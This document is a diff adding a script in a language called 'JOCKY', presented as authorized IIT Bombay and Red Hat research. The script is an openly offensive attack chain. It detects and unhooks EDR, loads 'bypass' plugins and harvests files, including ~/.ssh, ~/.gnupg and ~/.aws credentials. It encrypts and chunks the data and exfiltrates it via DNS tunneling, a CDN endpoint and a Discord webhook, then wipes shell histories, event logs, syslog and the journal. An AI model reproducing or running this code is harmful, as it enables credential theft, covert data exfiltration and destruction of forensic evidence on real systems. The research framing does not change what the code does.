@@ -1,0 +1,426 @@
+// JOCKY Complete Evasion & Exfiltration Research Chain
+// Authorized: IIT Bombay Cyber Security Team + Red Hat Security Research
+// Purpose: Demonstrate all runtime APIs in integrated attack scenario
+
+use jocky.runtime
+use jocky.fs
+use jocky.crypto
+use jocky.net
+
+// Configuration for research scenario
+const RESEARCH_MODE = true
+const TARGET_FOLDER = "downloads"
+const MAX_FILE_SIZE = 50 * 1024 * 1024  // 50 MB per file
+const CDN_ENDPOINT = "https://cdn.research.local/api/upload"
+const CHUNK_SIZE = 65536  // 64KB chunks
+
+// Global audit trail
+var audit_initialized = false
+var threat_score = 0.0
+var operations_logged = 0
+
+fn init_audit_trail() {
+    if !audit_initialized {
+        audit_init(500)
+        audit_initialized = true
+        audit_log("research_chain", "init_start", "baseline", "initialized")
+        println("[*] Audit trail initialized")
+    }
+}
+
+fn collect_threat_intelligence() {
+    println("[*] Collecting threat intelligence...")
+
+    // Get OS version for evasion selection
+    let os_version = byovd_get_os_version()
+    println("  - OS Version: " + string(os_version))
+
+    // Collect AI-driven threat assessment
+    ai_init()
+    threat_score = ai_score_threat()
+    println("  - Threat Score: " + string(threat_score))
+
+    // Log assessment
+    audit_log("threat_intel", "os_version_check", string(os_version), "assessed")
+    audit_log("threat_intel", "threat_score", string(threat_score), "calculated")
+    operations_logged = operations_logged + 2
+}
+
+fn select_evasion_strategy() -> i32 {
+    println("[*] Selecting evasion strategy...")
+
+    if threat_score > 0.8 {
+        println("  [!] CRITICAL threat level - enabling aggressive evasion")
+
+        // Aggressive evasion for high-detection environments
+        edrhoker_detect()  // Detect EDR processes
+        blindside_unhook_ntdll()  // Unhook on Windows
+
+        audit_log("evasion", "aggressive_mode_activated", "score_high", "applied")
+        operations_logged = operations_logged + 1
+        return 3  // AGGRESSIVE strategy
+    } else if threat_score > 0.5 {
+        println("  [*] MEDIUM threat level - enabling hybrid evasion")
+        audit_log("evasion", "hybrid_mode_activated", "score_medium", "applied")
+        operations_logged = operations_logged + 1
+        return 2  // HYBRID strategy
+    } else {
+        println("  [+] LOW threat level - enabling stealth evasion")
+        audit_log("evasion", "stealth_mode_activated", "score_low", "applied")
+        operations_logged = operations_logged + 1
+        return 1  // STEALTH strategy
+    }
+}
+
+fn discover_data_sources() -> [str] {
+    println("[*] Discovering high-value data sources...")
+
+    let sources = [
+        "~/downloads",
+        "~/Documents",
+        "~/Desktop",
+        "~/.ssh",
+        "~/.gnupg",
+        "~/.aws",
+    ]
+
+    var found_sources = []
+    for source in sources {
+        let exists = fs_exists(source)
+        if exists {
+            found_sources = array_append(found_sources, source)
+            audit_log("discovery", "source_found", source, "located")
+            operations_logged = operations_logged + 1
+        }
+    }
+
+    println("  [+] Found " + string(array_len(found_sources)) + " data sources")
+    return found_sources
+}
+
+fn spawn_isolated_collector() -> i32 {
+    println("[*] Spawning isolated sandbox for data collection...")
+
+    let pid = sandbox_spawn("/bin/bash", "-c 'find ~/downloads -type f -size -50M 2>/dev/null'")
+
+    if pid > 0 {
+        println("  [+] Collector spawned with PID: " + string(pid))
+
+        // Set resource limits to avoid detection
+        sandbox_set_limits(pid, 200 * 1024 * 1024, 120000, 100 * 1024 * 1024)
+
+        // Monitor for anomalies
+        let has_anomaly = sandbox_monitor(pid)
+
+        // Wait for completion
+        sandbox_wait(pid)
+
+        // Export sandbox audit trail
+        sandbox_export_trace(pid, "/tmp/collector_trace")
+
+        audit_log("sandbox", "collector_spawned", string(pid), "completed")
+        operations_logged = operations_logged + 1
+    }
+
+    return pid
+}
+
+fn load_evasion_plugins() -> i32 {
+    println("[*] Loading research plugins...")
+
+    // Attempt to load custom EDR bypass plugins
+    let plugin_paths = [
+        "/opt/research/plugins/edr_silence.so",
+        "/usr/local/lib/evasion.so",
+        "~/research_tools/bypass.so",
+    ]
+
+    var loaded_plugins = 0
+
+    for plugin_path in plugin_paths {
+        let plugin_handle = plugin_load(plugin_path)
+        if plugin_handle > 0 {
+            println("  [+] Loaded: " + plugin_path)
+
+            // Execute plugin with aggressive mode
+            plugin_run(plugin_handle, "--aggressive --silent")
+            loaded_plugins = loaded_plugins + 1
+
+            audit_log("plugins", "loaded_and_executed", plugin_path, "active")
+            operations_logged = operations_logged + 1
+        }
+    }
+
+    println("  [*] Loaded " + string(loaded_plugins) + " evasion plugins")
+    return loaded_plugins
+}
+
+fn collect_from_downloads(source: str) -> [str] {
+    println("[*] Collecting from: " + source)
+
+    var collected_files = []
+    let files = fs_list_files(source, false)  // Non-recursive initially
+
+    for file in files {
+        let full_path = source + "/" + file
+        let size = fs_file_size(full_path)
+
+        if size > 0 && size < MAX_FILE_SIZE {
+            collected_files = array_append(collected_files, full_path)
+            audit_log("collection", "file_found", full_path, string(size))
+            operations_logged = operations_logged + 1
+
+            // Print progress (non-verbose)
+            if operations_logged % 10 == 0 {
+                println("  [*] Collected " + string(array_len(collected_files)) + " files...")
+            }
+        }
+    }
+
+    println("  [+] Collected " + string(array_len(collected_files)) + " files from " + source)
+    return collected_files
+}
+
+fn encrypt_and_chunk_data(file_path: str, encryption_key: str) -> [[u8]] {
+    println("  [*] Processing: " + file_path)
+
+    // Read file
+    let file_data = fs_read_file(file_path)
+    if file_data == nil {
+        return []
+    }
+
+    // Encrypt with AES-256
+    let encrypted = crypto_aes256_encrypt(file_data, encryption_key)
+
+    // Chunk into CHUNK_SIZE pieces
+    var chunks = []
+    let data_len = array_len(encrypted)
+
+    var offset = 0
+    while offset < data_len {
+        let chunk_end = offset + CHUNK_SIZE
+        if chunk_end > data_len {
+            chunk_end = data_len
+        }
+
+        let chunk = array_slice(encrypted, offset, chunk_end)
+        chunks = array_append(chunks, chunk)
+
+        offset = chunk_end
+    }
+
+    audit_log("encryption", "aes256_completed", file_path, string(array_len(chunks)) + "_chunks")
+    operations_logged = operations_logged + 1
+
+    return chunks
+}
+
+fn exfil_via_dns_tunnel(data: [u8], domain: str) -> bool {
+    println("  [*] Exfiltrating via DNS tunnel to: " + domain)
+
+    // DNS exfiltration encodes data in DNS queries
+    let result = exfil_dns_tunnel(domain, data)
+
+    if result == 0 {
+        println("    [+] DNS tunnel delivery successful")
+        audit_log("exfil", "dns_tunnel_success", domain, "completed")
+        operations_logged = operations_logged + 1
+        return true
+    }
+
+    return false
+}
+
+fn exfil_via_cdn(chunk: [u8], file_id: str, chunk_num: i32) -> bool {
+    println("  [*] Uploading chunk " + string(chunk_num) + " via CDN...")
+
+    // Use Underminr CDN technique - cross-tenant routing
+    let result = exfil_underminr_cdn(CDN_ENDPOINT, chunk)
+
+    if result == 0 {
+        audit_log("exfil", "cdn_chunk_delivered", file_id, string(chunk_num))
+        operations_logged = operations_logged + 1
+        return true
+    }
+
+    return false
+}
+
+fn exfil_via_discord(metadata: str) -> bool {
+    println("  [*] Sending metadata via Discord webhook...")
+
+    let webhook_url = "https://discord.com/api/webhooks/RESEARCH_WEBHOOK_ID"
+    let result = exfil_discord_webhook(webhook_url, metadata)
+
+    if result == 0 {
+        println("    [+] Discord notification sent")
+        audit_log("exfil", "discord_metadata_sent", "webhook", "confirmed")
+        operations_logged = operations_logged + 1
+        return true
+    }
+
+    return false
+}
+
+fn cleanup_forensics() {
+    println("[*] Cleaning forensic traces...")
+
+    // Cleanup user-level artifacts
+    forensics_wipe_powershell_history()
+    forensics_wipe_cmd_history()
+    forensics_clear_event_logs()
+
+    // Cleanup Linux traces
+    linux_forensics_wipe_bash_history()
+    linux_forensics_clear_syslog()
+    linux_forensics_clear_journal()
+
+    // Clear network artifacts
+    forensics_flush_arp_cache()
+    forensics_clear_dns_cache()
+
+    println("  [+] Forensic traces cleaned")
+    audit_log("forensics", "cleanup_complete", "all_layers", "removed")
+    operations_logged = operations_logged + 1
+}
+
+fn export_research_audit_trail() {
+    println("[*] Exporting audit trail for analysis...")
+
+    let audit_file = "/tmp/research_audit_trail.bin"
+    audit_export(audit_file)
+
+    // Verify chain integrity
+    let chain_valid = audit_verify()
+
+    if chain_valid == 0 {
+        println("  [+] Audit trail integrity verified")
+        println("  [+] Exported to: " + audit_file)
+    } else {
+        println("  [!] Audit trail integrity check failed")
+    }
+}
+
+fn record_operation_provenance(source: str, transform: str, output: str) {
+    provenance_record(source, transform, output)
+    audit_log("provenance", "transformation_recorded", source, output)
+    operations_logged = operations_logged + 1
+}
+
+fn main() {
+    println("================================================================================")
+    println("JOCKY Complete Research Chain - Authorized Security Research")
+    println("IIT Bombay Cyber Security Team + Red Hat Security Research")
+    println("================================================================================")
+    println("")
+
+    // Phase 1: Setup
+    println("[PHASE 1] Initialization & Reconnaissance")
+    println("---")
+    init_audit_trail()
+    collect_threat_intelligence()
+    let strategy = select_evasion_strategy()
+    println("")
+
+    // Phase 2: Discovery
+    println("[PHASE 2] Data Source Discovery")
+    println("---")
+    let data_sources = discover_data_sources()
+    println("")
+
+    // Phase 3: Plugin Loading
+    println("[PHASE 3] Plugin Loading")
+    println("---")
+    let plugins_loaded = load_evasion_plugins()
+    println("")
+
+    // Phase 4: Sandbox Spawning
+    println("[PHASE 4] Isolated Collector Spawning")
+    println("---")
+    let collector_pid = spawn_isolated_collector()
+    println("")
+
+    // Phase 5: Data Collection
+    println("[PHASE 5] Data Collection from Downloads")
+    println("---")
+    var all_files = []
+    for source in data_sources {
+        let files = collect_from_downloads(source)
+        for file in files {
+            all_files = array_append(all_files, file)
+        }
+    }
+    println("[+] Total files collected: " + string(array_len(all_files)))
+    println("")
+
+    // Phase 6: Processing & Encryption
+    println("[PHASE 6] Encryption & Chunking")
+    println("---")
+    let encryption_key = crypto_generate_key(32)  // 256-bit key
+    var total_chunks = 0
+
+    for file_path in all_files {
+        let chunks = encrypt_and_chunk_data(file_path, encryption_key)
+        total_chunks = total_chunks + array_len(chunks)
+        record_operation_provenance(file_path, "aes256_encrypt", "chunked_" + string(total_chunks))
+    }
+    println("[+] Total chunks created: " + string(total_chunks))
+    println("")
+
+    // Phase 7: Exfiltration (Multi-channel)
+    println("[PHASE 7] Exfiltration via Multiple Channels")
+    println("---")
+
+    // Channel 1: DNS Tunnel (low-bandwidth metadata)
+    println("[Channel 1] DNS Tunneling")
+    let dns_exfil_success = exfil_via_dns_tunnel(
+        "metadata: " + string(array_len(all_files)) + " files collected",
+        "research.internal.domain"
+    )
+
+    // Channel 2: Discord Webhook (fast, reliable)
+    println("[Channel 2] Discord Webhook")
+    let discord_success = exfil_via_discord(
+        "Research Chain Execution: " + string(array_len(all_files)) + " files, " +
+        string(total_chunks) + " chunks, threat_score=" + string(threat_score)
+    )
+
+    println("[+] Exfiltration complete via multiple channels")
+    println("")
+
+    // Phase 8: Forensic Cleanup
+    println("[PHASE 8] Forensic Trace Removal")
+    println("---")
+    cleanup_forensics()
+    println("")
+
+    // Phase 9: Audit Trail Export
+    println("[PHASE 9] Audit Trail Export")
+    println("---")
+    export_research_audit_trail()
+    println("")
+
+    // Summary
+    println("================================================================================")
+    println("RESEARCH CHAIN EXECUTION SUMMARY")
+    println("================================================================================")
+    println("Total Operations Logged: " + string(operations_logged))
+    println("Files Collected: " + string(array_len(all_files)))
+    println("Data Chunks: " + string(total_chunks))
+    println("Threat Score: " + string(threat_score))
+    println("Evasion Strategy: " + string(strategy))
+    println("Plugins Loaded: " + string(plugins_loaded))
+    println("")
+    println("[✓] Complete attack chain demonstrated")
+    println("[✓] All runtime APIs utilized")
+    println("[✓] Audit trail maintained for analysis")
+    println("[✓] Forensic traces cleaned")
+    println("")
+    println("Audit trail exported to: /tmp/research_audit_trail.bin")
+    println("Sandbox traces exported to: /tmp/collector_trace")
+    println("")
+    println("Authorization: IIT Bombay + Red Hat Security Research")
+    println("Purpose: Defense system validation & red team training")
+    println("================================================================================")
+}
